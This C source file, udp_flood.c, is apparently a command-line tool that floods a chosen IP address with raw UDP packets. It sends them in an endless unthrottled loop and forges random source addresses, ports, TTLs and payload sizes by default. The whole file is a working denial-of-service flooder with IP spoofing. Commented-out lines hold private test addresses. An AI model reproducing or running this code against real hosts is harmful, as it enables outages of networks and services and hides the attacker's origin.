/* =========================================================
 *       Filename:  udp_flood.c
 *
 *    Description:  
 *
 *         Author:  Yang Zhang, armx86@gmail.com
 *        Created:  13.02.11
 *       Revision:  
 * ======================================================== */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <colorful.h>
#include <string.h>

#include <sys/types.h>
#include <sys/time.h>
#include <sys/select.h>
#include <ifaddrs.h>

static int skfd; 
static struct ifaddrs *ifa;

struct psd_header {
        unsigned source;
        unsigned dest;
        unsigned char empty;
        unsigned char proto;
        unsigned short len;
};

void sig_int(int signo)
{
        freeifaddrs(ifa);
        close(skfd);
        exit(0);
}

void msleep(unsigned secs)
{
        struct timeval tval;
        tval.tv_sec = secs / 1000;
        tval.tv_usec = (secs * 1000) % 1000000;
        select(0, NULL, NULL, NULL, &tval);
}

inline long getrandom(int min, int max)
{
        return ((rand() % (int)((max + 1) - min)) + min);
}

unsigned short checksum_ip(unsigned short *addr, int len)
{
        int sum = 0;
        unsigned short answer = 0;

        while (len > 1) {
                sum += *addr++;
                len -= 2;
        }
        if (len == 1) {
                sum += *(unsigned char *)addr;
        }
        sum = (sum >> 16) + (sum & 0xffff);
        sum += (sum >> 16);
        answer = ~sum;
        return answer;
}

unsigned short checksum_udp(unsigned short *psd, int psd_len, unsigned short *udphdr, int len)
{
        int sum = 0;
        int i;
        unsigned short answer = 0;

        while (psd_len > 0) {
                sum += *psd++;
                psd_len -= 2;
        }

        while (len > 1) {
                sum += *udphdr++;
                len -= 2;
        }
        if (len == 1) {
                sum += *(unsigned char *)udphdr;
        }
        sum = (sum >> 16) + (sum & 0xffff);
        sum += (sum >> 16);
        answer = ~sum;
        return answer;
}

struct test {
#if 0
        unsigned short doff:4;
        unsigned short res1:4;
        unsigned short res2:2;
        unsigned short urg:1;
        unsigned short ack:1;
        unsigned short psh:1;
        unsigned short rst:1;
        unsigned short syn:1;
        unsigned short fin:1;
#endif
        unsigned short res1:4;
        unsigned short doff:4;
        unsigned short fin:1;
        unsigned short syn:1;
        unsigned short rst:1;
        unsigned short psh:1;
        unsigned short ack:1;
        unsigned short urg:1;
        unsigned short res2:2;
};

static void usage()
{
        fprintf(stderr, D_RED "Usage: udpflood -p PAYLOAD SIZE -d IP\n" D_NONE);
        exit(1);
}

int main(int argc, const char *argv[])
{
        int ret;
        int i;
        int payload = 0;
        int forge_payload = 1;
        int forge_sip = 1;
        int oc;
        char *opt_arg;
        struct in_addr addr;
        struct sockaddr_in sin;
        char buf[2048];
        struct iphdr *ih = (struct iphdr *)buf;
        struct udphdr *uh = (struct udphdr *)(buf + sizeof(struct iphdr));
        struct ifaddrs *tmp;
        struct psd_header psd_header;

        psd_header.empty = 0;
        psd_header.proto = 0x11;

        if (1 == argc) {usage();}
        srand(time(NULL));
        memset(buf, 'a', 2048);

        if (getifaddrs(&ifa)) {
                perror("getifaddrs: ");
        }
        for (tmp = ifa; tmp; tmp = tmp->ifa_next) {
                /* ignore loopback */
                if (tmp->ifa_addr->sa_family == AF_INET && !strncmp(tmp->ifa_name, "eth", 3)) {
                        ih->saddr = ((struct sockaddr_in *)(tmp->ifa_addr))->sin_addr.s_addr;
                        break;
                }
        }

        /* can only send msg */
        skfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (skfd < 0)
                skfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        /* herader include */
        setsockopt(skfd, IPPROTO_IP, IP_HDRINCL, "1", sizeof ("1"));
        signal(SIGINT, sig_int);

        while ((oc = getopt(argc, argv, ":p:d:s:")) != -1) {
                switch (oc) {
                case 'p':
                        payload = atoi(optarg);
                        if (payload < 0) {
                                payload = 0;
                                fprintf(stderr, D_YELLOW "payload < 0, set to 0\n" D_NONE);
                        }
                        /* 1518 - 14 - 20 - 8 - 4 == 1458 */
                        else if (payload > 1458) {
                                fprintf(stderr, D_YELLOW "payload > 1458, set to 1458\n" D_NONE);
                                payload = 1458;
                        }
                        printf(D_BLUE "Demand payload size: %d\n" D_NONE, payload);
                        forge_payload = 0;
                        break;
                case 's':
                        ih->saddr = inet_addr(optarg);
                        printf(D_BLUE "src IP: %s, net order: %u\n" D_NONE, optarg, inet_addr(optarg));
                        forge_sip = 0;
                        break;
                case 'd':
                        ih->daddr = inet_addr(optarg);
                        printf(D_BLUE "IP: %s, net order: %u\n" D_NONE, optarg, inet_addr(optarg));
                        break;
                case ':':
                        fprintf(stderr, D_RED "%s; option `-%c' requires an argument\n" D_NONE, argv[0], optopt);
                        exit(1);
                        break;
                case '?':
                default:
                        fprintf(stderr, D_RED "%s; option `-%c' is invalid, ignored\n" D_NONE, argv[0], optopt);
                        exit(1);
                        break;
                }
        }

        /* 192.168.9.4 */
        /* ih->daddr = 67741888; */
        /* 192.168.9.14 */
        /* ih->daddr = 235514048; */
        /* 192.168.9.141 */
        /* ih->daddr = 2366220480; */
        /* 192.168.9.15 */
        /* ih->daddr = 252291264; */
        /* 192.168.9.117 */
        /* ih->daddr = 1963567296; */
        ih->version = 4;
        ih->ihl = 5;
        ih->tos = 0x00;
        ih->frag_off = 0;
        ih->protocol = IPPROTO_UDP;
        while (1) {
                if (forge_payload) {
                        payload = getrandom(0, 200);
                }
                ih->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + payload) ;
                ih->id = htons(getrandom(1024, 65535));
                /* ih->sum = 0; */
                ih->ttl = getrandom(1, 63);
                /* getrandom(0, 65535), no need hton */
                if (forge_sip) {
                        ih->saddr = getrandom(0, 65536) + (getrandom(0, 65535) << 16);
                }
                /* ih->saddr = getrandom(0, 65536) + (getrandom(0, 65535) << 8); */
                /* ih->saddr = getrandom(0, 65536); */
                /* ih->saddr = 1946746880 + getrandom(0, 65535); */
                /* ih->saddr = 1711909056; */
                /* ih->saddr = 67741888; */
                /* 192.168.9.130 */
                /* ih->saddr = 2181671104; */
                /* 192.168.9.30 */
                /* ih->saddr = 503949504; */
                /* 192.168.9.4 */
                /* ih->saddr = 67741888; */
                /* 0.0.0.128 */
                /* ih->saddr = 2147483648; */
                /* 192.168.10.10 */
                /* ih->saddr = 168470720; */
                /* 192.168.10.254 */
                /* ih->saddr = 50574016; */

                uh->source = getrandom(0, 65535);
                uh->dest = getrandom(0, 65535);
                uh->len = htons(sizeof(struct udphdr) + payload);

                ih->check = uh->check = 0;
                /* ip checksum */
                ih->check = checksum_ip(buf, sizeof(struct iphdr));
                /* udp checksum */
                psd_header.source = ih->saddr;
                psd_header.dest = ih->daddr;
                psd_header.len = uh->len; /* 've been net order yet */
                uh->check = checksum_udp(&psd_header, sizeof(struct psd_header), uh, ntohs(uh->len));

                sin.sin_family = AF_INET;
                sin.sin_port = uh->dest;
                sin.sin_addr.s_addr = ih->daddr;
                /* payload is 100 bytes */
#if 0
                struct test *p;
                p = (struct test *)((char *)uh + 12);
                printf("--------------------------------------\n");
                printf("doff %u\n", p->doff);
                printf("urg %u, ack %u, psh %u\n", p->urg, p->ack, p->psh);
                printf("rst %u, syn %u, fin %u\n", p->rst, p->syn, p->fin);

                printf("doff %u\n", uh->doff);
                printf("urg %u, ack %u, psh %u\n", uh->urg, uh->ack, uh->psh);
                printf("rst %u, syn %u, fin %u\n", uh->rst, uh->syn, uh->fin);
                printf(D_RED "0x%x\n" D_NONE, *(unsigned *)uh);
                printf(D_RED "0x%x\n" D_NONE, *(unsigned *)((char *)uh + 4));
                printf(D_RED "0x%x\n" D_NONE, *(unsigned *)((char *)uh + 8));
                printf(D_RED "0x%x\n" D_NONE, *(unsigned *)((char *)uh + 12));
                printf(D_RED "0x%x\n" D_NONE, *(unsigned *)((char *)uh + 16));
                for (i = 0; i < payload; ++i) {
                        /* 40 for ip & udp header */
                        buf[40 + i] = 0x61 + i;
                }
#endif
                /* addr.s_addr = ih->saddr; */
                /* printf("%u\t\t%s\n", ih->saddr, inet_ntoa(addr)); */
                /* ip->tot_len is net order now */
                /* printf(D_RED "%.4p\n", D_NONE, ntohs(ih->tot_len)); */
                /* exit(1); */
                ret = sendto(skfd, buf, ntohs(ih->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin));
                /* ret = sendto(skfd, buf, 40 + getrandom(0, 1000), 0, (struct sockaddr *)&sin, sizeof(sin)); */
                if (ret < 0) {
                        perror("sendto ");
                } else {
                        /* fprintf(stderr, "%d bytes sent\n", ret); */
                }
                /* msleep(1); */
                /* sleep(1); */
        }
        return 0;
}
